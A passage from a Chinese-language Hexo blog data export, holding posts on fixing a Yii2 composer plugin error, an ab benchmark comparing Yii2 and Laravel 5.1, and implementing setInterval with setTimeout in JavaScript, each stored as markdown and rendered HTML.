&quot;2.*&quot;</span><br></pre></td></tr></table></figure></p>\n<p>这是yii2依赖库 <strong>fxp/composer-asset-plugin</strong> 的问题，要解决这个问题，需要升级它。</p>\n<p>yii2官网上让我们使用的是 1.0.0版本，现在要使用最新的dev-master版本才行。可以直接运行：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ composer.phar global require &quot;fxp/composer-asset-plugin:1.0.*@dev&quot;</span><br></pre></td></tr></table></figure></p>\n<p>它会覆盖掉原先global全局有问题的1.0.0版本配置</p>\n<p>然后重新 <strong>composer update</strong> 即可</p>\n<p>参考：</p>\n<p><a href=\"http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2</a></p>\n"},{"title":"yii2和laravel5.1性能比较","id":"159","date":"2015-08-02T09:29:07.000Z","_content":"\n周末对yii2和laravel5.1进行了简单的性能测试，结果是yii2比laravel5.1快很多。\n\n## 测试环境\n\n### 系统\n\n*   Fedora 22\n*   linux: Linux 4.0.8-300.fc22.x86_64\n*   gcc: 版本 5.1.1 20150618 (Red Hat 5.1.1-4) (GCC)\n*   Mem: 8 GiB\n*   cpu: Intel® Core™ i7-4702MQ CPU @ 2.20GHz × 8\n\n### 框架\n\n*   laravel 5.1\n*   yii 2.0 (basic类型，它和advanced区别主要在于目录结构，就是少include了两三个配置文件，性能差距不大)\n\n### 环境\n\n*   统一都是生产环境，关闭了debug。\n*   语言包等其他配置都选用默认的配置\n\n### 测试代码\n\n定义一个新的控制器，简单的输出 hello 字符\n\n## 测试\n\n我每次用**ab -n 3000**来测试，分成多次交叉测试，得出的结果都差不多。\n\n### 结果\n\n在默认情况下，简单的输出hello程序下，yii2的性能是laravel5.1的4倍多！\n\n我原先以为差不了多少，但真的很意外。不过laravel我不太熟悉，也许有哪些可以优化的地方，但在默认配置下，yii2确实完爆laravel。\n\n当然评价框架不能只看性能，我用yii2做过三四个项目，它在功能和设计方面也很强大，扩展性十足。是我最爱的框架！\n\n## 不公平的地方\n\nyii2默认不会设置session和XSRF-TOKEN，但laravel会，所以主要性能差距应该就是这个造成的。但从设计上，yii2总是按需加载，只有当使用视图的**ActiveForm**时它才会主动设置**XSRF**，显然比laravel要灵活。\n\n所以我也给yii加上了启用session的代码：`\\Yii::$app->session->open();`，但仍然比laravel快4倍多。结果见最下。\n\n## 原因\n\n至于为什么差距这么大，下次有时间再看吧。已知的差别：\n\n*   laravel自己实现了session，比起yii2用的原生的要慢，但可能安全性更高。\n&nbsp;\n\n### 附测试数据\n\nab测试3000次请求，这里各列出随机的一组测试\n\n#### laravel 5.1\n\n```\n$ ab -n 3000 http://laravel.localhost/test\nConcurrency Level:      1\nTime taken for tests:   19.507 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      2952398 bytes\nHTML transferred:       15000 bytes\nRequests per second:    153.79 [#/sec] (mean)\nTime per request:       6.502 [ms] (mean)\nTime per request:       6.502 [ms] (mean, across all concurrent requests)\nTransfer rate:          147.81 [Kbytes/sec] received\n\n```\n\n#### Yii 2.0 （默认配置，不开启session）\n\n```\n$ ab -n 3000 http://yii2.localhost/test\nConcurrency Level:      1\nTime taken for tests:   4.456 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      501000 bytes\nHTML transferred:       15000 bytes\nRequests per second:    673.24 [#/sec] (mean)\nTime per request:       1.485 [ms] (mean)\nTime per request:       1.485 [ms] (mean, across all concurrent requests)\nTransfer rate:          109.80 [Kbytes/sec] received\n\n```\n\n#### Yii 2.0 （为了和laravel保持一致，所以也开启session）\n\n```\nConcurrency Level:      1\nTime taken for tests:   5.045 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      1116000 bytes\nHTML transferred:       15000 bytes\nRequests per second:    594.67 [#/sec] (mean)\nTime per request:       1.682 [ms] (mean)\nTime per request:       1.682 [ms] (mean, across all concurrent requests)\nTransfer rate:          216.03 [Kbytes/sec] received\n```\n&nbsp;","source":"_posts/yii2-e5-92-8claravel5-1-e6-80-a7-e8-83-bd-e6-af-94-e8-be-83.md","raw":"---\ntitle: yii2和laravel5.1性能比较\nid: 159\ncategories:\n  - php\ndate: 2015-08-02 17:29:07\ntags:\n---\n\n周末对yii2和laravel5.1进行了简单的性能测试，结果是yii2比laravel5.1快很多。\n\n## 测试环境\n\n### 系统\n\n*   Fedora 22\n*   linux: Linux 4.0.8-300.fc22.x86_64\n*   gcc: 版本 5.1.1 20150618 (Red Hat 5.1.1-4) (GCC)\n*   Mem: 8 GiB\n*   cpu: Intel® Core™ i7-4702MQ CPU @ 2.20GHz × 8\n\n### 框架\n\n*   laravel 5.1\n*   yii 2.0 (basic类型，它和advanced区别主要在于目录结构，就是少include了两三个配置文件，性能差距不大)\n\n### 环境\n\n*   统一都是生产环境，关闭了debug。\n*   语言包等其他配置都选用默认的配置\n\n### 测试代码\n\n定义一个新的控制器，简单的输出 hello 字符\n\n## 测试\n\n我每次用**ab -n 3000**来测试，分成多次交叉测试，得出的结果都差不多。\n\n### 结果\n\n在默认情况下，简单的输出hello程序下，yii2的性能是laravel5.1的4倍多！\n\n我原先以为差不了多少，但真的很意外。不过laravel我不太熟悉，也许有哪些可以优化的地方，但在默认配置下，yii2确实完爆laravel。\n\n当然评价框架不能只看性能，我用yii2做过三四个项目，它在功能和设计方面也很强大，扩展性十足。是我最爱的框架！\n\n## 不公平的地方\n\nyii2默认不会设置session和XSRF-TOKEN，但laravel会，所以主要性能差距应该就是这个造成的。但从设计上，yii2总是按需加载，只有当使用视图的**ActiveForm**时它才会主动设置**XSRF**，显然比laravel要灵活。\n\n所以我也给yii加上了启用session的代码：`\\Yii::$app->session->open();`，但仍然比laravel快4倍多。结果见最下。\n\n## 原因\n\n至于为什么差距这么大，下次有时间再看吧。已知的差别：\n\n*   laravel自己实现了session，比起yii2用的原生的要慢，但可能安全性更高。\n&nbsp;\n\n### 附测试数据\n\nab测试3000次请求，这里各列出随机的一组测试\n\n#### laravel 5.1\n\n```\n$ ab -n 3000 http://laravel.localhost/test\nConcurrency Level:      1\nTime taken for tests:   19.507 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      2952398 bytes\nHTML transferred:       15000 bytes\nRequests per second:    153.79 [#/sec] (mean)\nTime per request:       6.502 [ms] (mean)\nTime per request:       6.502 [ms] (mean, across all concurrent requests)\nTransfer rate:          147.81 [Kbytes/sec] received\n\n```\n\n#### Yii 2.0 （默认配置，不开启session）\n\n```\n$ ab -n 3000 http://yii2.localhost/test\nConcurrency Level:      1\nTime taken for tests:   4.456 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      501000 bytes\nHTML transferred:       15000 bytes\nRequests per second:    673.24 [#/sec] (mean)\nTime per request:       1.485 [ms] (mean)\nTime per request:       1.485 [ms] (mean, across all concurrent requests)\nTransfer rate:          109.80 [Kbytes/sec] received\n\n```\n\n#### Yii 2.0 （为了和laravel保持一致，所以也开启session）\n\n```\nConcurrency Level:      1\nTime taken for tests:   5.045 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      1116000 bytes\nHTML transferred:       15000 bytes\nRequests per second:    594.67 [#/sec] (mean)\nTime per request:       1.682 [ms] (mean)\nTime per request:       1.682 [ms] (mean, across all concurrent requests)\nTransfer rate:          216.03 [Kbytes/sec] received\n```\n&nbsp;","slug":"yii2-e5-92-8claravel5-1-e6-80-a7-e8-83-bd-e6-af-94-e8-be-83","published":1,"updated":"2018-03-05T12:57:36.656Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhx50036lzlmydcui508","content":"<p>周末对yii2和laravel5.1进行了简单的性能测试，结果是yii2比laravel5.1快很多。</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><h3 id=\"系统\"><a href=\"#系统\" class=\"headerlink\" title=\"系统\"></a>系统</h3><ul>\n<li>Fedora 22</li>\n<li>linux: Linux 4.0.8-300.fc22.x86_64</li>\n<li>gcc: 版本 5.1.1 20150618 (Red Hat 5.1.1-4) (GCC)</li>\n<li>Mem: 8 GiB</li>\n<li>cpu: Intel® Core™ i7-4702MQ CPU @ 2.20GHz × 8</li>\n</ul>\n<h3 id=\"框架\"><a href=\"#框架\" class=\"headerlink\" title=\"框架\"></a>框架</h3><ul>\n<li>laravel 5.1</li>\n<li>yii 2.0 (basic类型，它和advanced区别主要在于目录结构，就是少include了两三个配置文件，性能差距不大)</li>\n</ul>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><ul>\n<li>统一都是生产环境，关闭了debug。</li>\n<li>语言包等其他配置都选用默认的配置</li>\n</ul>\n<h3 id=\"测试代码\"><a href=\"#测试代码\" class=\"headerlink\" title=\"测试代码\"></a>测试代码</h3><p>定义一个新的控制器，简单的输出 hello 字符</p>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><p>我每次用<strong>ab -n 3000</strong>来测试，分成多次交叉测试，得出的结果都差不多。</p>\n<h3 id=\"结果\"><a href=\"#结果\" class=\"headerlink\" title=\"结果\"></a>结果</h3><p>在默认情况下，简单的输出hello程序下，yii2的性能是laravel5.1的4倍多！</p>\n<p>我原先以为差不了多少，但真的很意外。不过laravel我不太熟悉，也许有哪些可以优化的地方，但在默认配置下，yii2确实完爆laravel。</p>\n<p>当然评价框架不能只看性能，我用yii2做过三四个项目，它在功能和设计方面也很强大，扩展性十足。是我最爱的框架！</p>\n<h2 id=\"不公平的地方\"><a href=\"#不公平的地方\" class=\"headerlink\" title=\"不公平的地方\"></a>不公平的地方</h2><p>yii2默认不会设置session和XSRF-TOKEN，但laravel会，所以主要性能差距应该就是这个造成的。但从设计上，yii2总是按需加载，只有当使用视图的<strong>ActiveForm</strong>时它才会主动设置<strong>XSRF</strong>，显然比laravel要灵活。</p>\n<p>所以我也给yii加上了启用session的代码：<code>\\Yii::$app-&gt;session-&gt;open();</code>，但仍然比laravel快4倍多。结果见最下。</p>\n<h2 id=\"原因\"><a href=\"#原因\" class=\"headerlink\" title=\"原因\"></a>原因</h2><p>至于为什么差距这么大，下次有时间再看吧。已知的差别：</p>\n<ul>\n<li>laravel自己实现了session，比起yii2用的原生的要慢，但可能安全性更高。<br>&nbsp;</li>\n</ul>\n<h3 id=\"附测试数据\"><a href=\"#附测试数据\" class=\"headerlink\" title=\"附测试数据\"></a>附测试数据</h3><p>ab测试3000次请求，这里各列出随机的一组测试</p>\n<h4 id=\"laravel-5-1\"><a href=\"#laravel-5-1\" class=\"headerlink\" title=\"laravel 5.1\"></a>laravel 5.1</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ab -n 3000 http://laravel.localhost/test</span><br><span class=\"line\">Concurrency Level:      1</span><br><span class=\"line\">Time taken for tests:   19.507 seconds</span><br><span class=\"line\">Complete requests:      3000</span><br><span class=\"line\">Failed requests:        0</span><br><span class=\"line\">Total transferred:      2952398 bytes</span><br><span class=\"line\">HTML transferred:       15000 bytes</span><br><span class=\"line\">Requests per second:    153.79 [#/sec] (mean)</span><br><span class=\"line\">Time per request:       6.502 [ms] (mean)</span><br><span class=\"line\">Time per request:       6.502 [ms] (mean, across all concurrent requests)</span><br><span class=\"line\">Transfer rate:          147.81 [Kbytes/sec] received</span><br></pre></td></tr></table></figure>\n<h4 id=\"Yii-2-0-（默认配置，不开启session）\"><a href=\"#Yii-2-0-（默认配置，不开启session）\" class=\"headerlink\" title=\"Yii 2.0 （默认配置，不开启session）\"></a>Yii 2.0 （默认配置，不开启session）</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ab -n 3000 http://yii2.localhost/test</span><br><span class=\"line\">Concurrency Level:      1</span><br><span class=\"line\">Time taken for tests:   4.456 seconds</span><br><span class=\"line\">Complete requests:      3000</span><br><span class=\"line\">Failed requests:        0</span><br><span class=\"line\">Total transferred:      501000 bytes</span><br><span class=\"line\">HTML transferred:       15000 bytes</span><br><span class=\"line\">Requests per second:    673.24 [#/sec] (mean)</span><br><span class=\"line\">Time per request:       1.485 [ms] (mean)</span><br><span class=\"line\">Time per request:       1.485 [ms] (mean, across all concurrent requests)</span><br><span class=\"line\">Transfer rate:          109.80 [Kbytes/sec] received</span><br></pre></td></tr></table></figure>\n<h4 id=\"Yii-2-0-（为了和laravel保持一致，所以也开启session）\"><a href=\"#Yii-2-0-（为了和laravel保持一致，所以也开启session）\" class=\"headerlink\" title=\"Yii 2.0 （为了和laravel保持一致，所以也开启session）\"></a>Yii 2.0 （为了和laravel保持一致，所以也开启session）</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Concurrency Level:      1</span><br><span class=\"line\">Time taken for tests:   5.045 seconds</span><br><span class=\"line\">Complete requests:      3000</span><br><span class=\"line\">Failed requests:        0</span><br><span class=\"line\">Total transferred:      1116000 bytes</span><br><span class=\"line\">HTML transferred:       15000 bytes</span><br><span class=\"line\">Requests per second:    594.67 [#/sec] (mean)</span><br><span class=\"line\">Time per request:       1.682 [ms] (mean)</span><br><span class=\"line\">Time per request:       1.682 [ms] (mean, across all concurrent requests)</span><br><span class=\"line\">Transfer rate:          216.03 [Kbytes/sec] received</span><br></pre></td></tr></table></figure>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>周末对yii2和laravel5.1进行了简单的性能测试，结果是yii2比laravel5.1快很多。</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><h3 id=\"系统\"><a href=\"#系统\" class=\"headerlink\" title=\"系统\"></a>系统</h3><ul>\n<li>Fedora 22</li>\n<li>linux: Linux 4.0.8-300.fc22.x86_64</li>\n<li>gcc: 版本 5.1.1 20150618 (Red Hat 5.1.1-4) (GCC)</li>\n<li>Mem: 8 GiB</li>\n<li>cpu: Intel® Core™ i7-4702MQ CPU @ 2.20GHz × 8</li>\n</ul>\n<h3 id=\"框架\"><a href=\"#框架\" class=\"headerlink\" title=\"框架\"></a>框架</h3><ul>\n<li>laravel 5.1</li>\n<li>yii 2.0 (basic类型，它和advanced区别主要在于目录结构，就是少include了两三个配置文件，性能差距不大)</li>\n</ul>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><ul>\n<li>统一都是生产环境，关闭了debug。</li>\n<li>语言包等其他配置都选用默认的配置</li>\n</ul>\n<h3 id=\"测试代码\"><a href=\"#测试代码\" class=\"headerlink\" title=\"测试代码\"></a>测试代码</h3><p>定义一个新的控制器，简单的输出 hello 字符</p>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><p>我每次用<strong>ab -n 3000</strong>来测试，分成多次交叉测试，得出的结果都差不多。</p>\n<h3 id=\"结果\"><a href=\"#结果\" class=\"headerlink\" title=\"结果\"></a>结果</h3><p>在默认情况下，简单的输出hello程序下，yii2的性能是laravel5.1的4倍多！</p>\n<p>我原先以为差不了多少，但真的很意外。不过laravel我不太熟悉，也许有哪些可以优化的地方，但在默认配置下，yii2确实完爆laravel。</p>\n<p>当然评价框架不能只看性能，我用yii2做过三四个项目，它在功能和设计方面也很强大，扩展性十足。是我最爱的框架！</p>\n<h2 id=\"不公平的地方\"><a href=\"#不公平的地方\" class=\"headerlink\" title=\"不公平的地方\"></a>不公平的地方</h2><p>yii2默认不会设置session和XSRF-TOKEN，但laravel会，所以主要性能差距应该就是这个造成的。但从设计上，yii2总是按需加载，只有当使用视图的<strong>ActiveForm</strong>时它才会主动设置<strong>XSRF</strong>，显然比laravel要灵活。</p>\n<p>所以我也给yii加上了启用session的代码：<code>\\Yii::$app-&gt;session-&gt;open();</code>，但仍然比laravel快4倍多。结果见最下。</p>\n<h2 id=\"原因\"><a href=\"#原因\" class=\"headerlink\" title=\"原因\"></a>原因</h2><p>至于为什么差距这么大，下次有时间再看吧。已知的差别：</p>\n<ul>\n<li>laravel自己实现了session，比起yii2用的原生的要慢，但可能安全性更高。<br>&nbsp;</li>\n</ul>\n<h3 id=\"附测试数据\"><a href=\"#附测试数据\" class=\"headerlink\" title=\"附测试数据\"></a>附测试数据</h3><p>ab测试3000次请求，这里各列出随机的一组测试</p>\n<h4 id=\"laravel-5-1\"><a href=\"#laravel-5-1\" class=\"headerlink\" title=\"laravel 5.1\"></a>laravel 5.1</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ab -n 3000 http://laravel.localhost/test</span><br><span class=\"line\">Concurrency Level:      1</span><br><span class=\"line\">Time taken for tests:   19.507 seconds</span><br><span class=\"line\">Complete requests:      3000</span><br><span class=\"line\">Failed requests:        0</span><br><span class=\"line\">Total transferred:      2952398 bytes</span><br><span class=\"line\">HTML transferred:       15000 bytes</span><br><span class=\"line\">Requests per second:    153.79 [#/sec] (mean)</span><br><span class=\"line\">Time per request:       6.502 [ms] (mean)</span><br><span class=\"line\">Time per request:       6.502 [ms] (mean, across all concurrent requests)</span><br><span class=\"line\">Transfer rate:          147.81 [Kbytes/sec] received</span><br></pre></td></tr></table></figure>\n<h4 id=\"Yii-2-0-（默认配置，不开启session）\"><a href=\"#Yii-2-0-（默认配置，不开启session）\" class=\"headerlink\" title=\"Yii 2.0 （默认配置，不开启session）\"></a>Yii 2.0 （默认配置，不开启session）</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ab -n 3000 http://yii2.localhost/test</span><br><span class=\"line\">Concurrency Level:      1</span><br><span class=\"line\">Time taken for tests:   4.456 seconds</span><br><span class=\"line\">Complete requests:      3000</span><br><span class=\"line\">Failed requests:        0</span><br><span class=\"line\">Total transferred:      501000 bytes</span><br><span class=\"line\">HTML transferred:       15000 bytes</span><br><span class=\"line\">Requests per second:    673.24 [#/sec] (mean)</span><br><span class=\"line\">Time per request:       1.485 [ms] (mean)</span><br><span class=\"line\">Time per request:       1.485 [ms] (mean, across all concurrent requests)</span><br><span class=\"line\">Transfer rate:          109.80 [Kbytes/sec] received</span><br></pre></td></tr></table></figure>\n<h4 id=\"Yii-2-0-（为了和laravel保持一致，所以也开启session）\"><a href=\"#Yii-2-0-（为了和laravel保持一致，所以也开启session）\" class=\"headerlink\" title=\"Yii 2.0 （为了和laravel保持一致，所以也开启session）\"></a>Yii 2.0 （为了和laravel保持一致，所以也开启session）</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Concurrency Level:      1</span><br><span class=\"line\">Time taken for tests:   5.045 seconds</span><br><span class=\"line\">Complete requests:      3000</span><br><span class=\"line\">Failed requests:        0</span><br><span class=\"line\">Total transferred:      1116000 bytes</span><br><span class=\"line\">HTML transferred:       15000 bytes</span><br><span class=\"line\">Requests per second:    594.67 [#/sec] (mean)</span><br><span class=\"line\">Time per request:       1.682 [ms] (mean)</span><br><span class=\"line\">Time per request:       1.682 [ms] (mean, across all concurrent requests)</span><br><span class=\"line\">Transfer rate:          216.03 [Kbytes/sec] received</span><br></pre></td></tr></table></figure>\n<p>&nbsp;</p>\n"},{"title":"用setTimeout实现setInterval","date":"2018-03-06T13:50:53.000Z","_content":"\n看到一个面试题：用 `setTimeout()` 实现 `setInterval()` 的功能，尝试做了下。\n\n## 简单版本\n\n本身没有难度，用递归实现即可\n\n```\nfunction setInterval(fn, delay) {\n  function interval() {\n    setTimeout(function() {\n      interval()\n      fn()\n    }, delay)\n  }\n\n  interval()\n}\n```\n\n## 支持clearInterval\n\n需要在全局保存`intervalID`，用来指向正在执行的`timeoutID`，调用`clearTimeout()`来终止执行。\n\n```\nfunction setInterval(fn, delay) {\n  if (!window.intervalIDs) {\n    window.intervalIDs = new Array(1)\n  }\n\n  const intervalID = window.intervalIDs.length\n  function interval() {\n    window.intervalIDs[intervalID] = setTimeout(function() {\n      interval()\n      fn()\n    }, delay)\n  }\n\n  interval()\n\n  return intervalID\n}\n\nfunction clearInterval(intervalID) {\n  clearTimeout(window.intervalIDs[intervalID])\n}\n```\n","source":"_posts/setTimeout-implement-setInterval.md","raw":"---\ntitle: 用setTimeout实现setInterval\ndate: 2018-03-06 21:50:53\ntags:\n---\n\n看到一个面试题：用 `setTimeout()` 实现 `setInterval()` 的功能，尝试做了下。\n\n## 简单版本\n\n本身没有难度，用递归实现即可\n\n```\nfunction setInterval(fn, delay) {\n  function interval() {\n    setTimeout(function() {\n      interval()\n      fn()\n    }, delay)\n  }\n\n  interval()\n}\n```\n\n## 支持clearInterval\n\n需要在全局保存`intervalID`，用来指向正在执行的`timeoutID`，调用`clearTimeout()`来终止执行。\n\n```\nfunction setInterval(fn, delay) {\n  if (!window.intervalIDs) {\n    window.intervalIDs = new Array(1)\n  }\n\n  const intervalID = window.intervalIDs.length\n  function interval() {\n    window.intervalIDs[intervalID] = setTimeout(function() {\n      interval()\n      fn()\n    }, delay)\n  }\n\n  interval()\n\n  return intervalID\n}\n\nfunction clearInterval(intervalID) {\n  clearTimeout(window.intervalIDs[intervalID])\n}\n```\n","slug":"setTimeout-implement-setInterval","published":1,"updated":"2018-03-06T14:12:52.030Z","_id":"cjefpppp60000l0lmqybhdrdt","comments":1,"layout":"post","photos":[],"link":"","content":"<p>看到一个面试题：用 <code>setTimeout()</code> 实现 <code>setInterval()</code> 的功能，尝试做了下。</p>\n<h2 id=\"简单版本\"><a href=\"#简单版本\" class=\"headerlink\" title=\"简单版本\"></a>简单版本</h2><p>本身没有难度，用递归实现即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function setInterval(fn, delay) &#123;</span><br><span class=\"line\">  function interval() &#123;</span><br><span class=\"line\">    setTimeout(function() &#123;</span><br><span class=\"line\">      interval()</span><br><span class=\"line\">      fn()</span><br><span class=\"line\">    &#125;, delay)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  interval()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"支持clearInterval\"><a href=\"#支持clearInterval\" class=\"headerlink\" title=\"支持clearInterval\"></a>支持clearInterval</h2><p>需要在全局保存<code>intervalID</code>，用来指向正在执行的<code>timeoutID</code>，调用<code>clearTimeout()</code>来终止执行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function setInterval(fn, delay) &#123;</span><br><span class=\"line\">  if (!window.intervalIDs) &#123;</span><br><span class=\"line\">    window.intervalIDs = new Array(1)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  const intervalID = window.intervalIDs.length</span><br><span class=\"line\">  function interval() &#123;</span><br><span class=\"line\">    window.intervalIDs[intervalID] = setTimeout(function() &#123;</span><br><span class=\"line\">      interval()</span><br><span class=\"line\">      fn()</span><br><span class=\"line\">    &#125;, delay)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  interval()</span><br><span class=\"line\"></span><br><span class=\"line\">  return intervalID</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function clearInterval(intervalID) &#123;</span><br><span class=\"line\">  clearTimeout(window.intervalIDs[intervalID])</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>看到一个面试题：用 <code>setTimeout()</code> 实现 <code>setInterval()</code> 的功能，尝试做了下。</p>\n<h2 id=\"简单版本\"><a href=\"#简单版本\" class=\"headerlink\" title=\"简单版本\"></a>简单版本</h2><p>本身没有难度，用递归实现即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function setInterval(fn, delay) &#123;</span><br><span class=\"line\">  function interval() &#123;</span><br><span class=\"line\">    setTimeout(function() &#123;</span><br><span class=\"line\">      interval()</span><br><span class=\"line\">      fn()</span><br><span class=\"line\">    &#125;, delay)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  interval()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"支持clearInterval\"><a href=\"#支持clearInterval\" class=\"headerlink\" title=\"支持clearInterval\"></a>支持clearInterval</h2><p>需要在全局保存<code>intervalID</code>，用来指向正在执行的<code>timeoutID</code>，调用<code>clearTimeout()</code>来终止执行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function setInterval(fn, delay) &#123;</span><br><span class=\"line\">  if (!window.intervalIDs) &#123;</span><br><span class=\"line\">    window.intervalIDs = new Array(1)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  const intervalID = window.intervalIDs.length</span><br><span class=\"line\">  function interval() &#123;</span><br><span class=\"line\">    window.intervalIDs[intervalID] = setTimeout(function() &#123;</span><br><span class=\"line\">      interval()</span><br><span class=\"line\">      fn()</span><br><span class=\"line\">    &#125;, delay)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  interval()</span><br><span class=\"line\"></span><br><span class=\"line\">  return intervalID</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function clearInterval(intervalID) &#123;</span><br><span class=\"line\">  clearTimeout(window.intervalIDs[intervalID])</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"webpack4性能小测试","date":"2018-03-06T16:16:29.000Z","_content":"\n之前写了个用webpack打包静态页面的项目：[webpack-static-pages-template](https://github.com/joaner/webpack-static-pages-template)\n\n最近webpack4已经正式发布了，对2/3/4版本做了性能测试，每个版本都有不错的速度提升。\n\n## 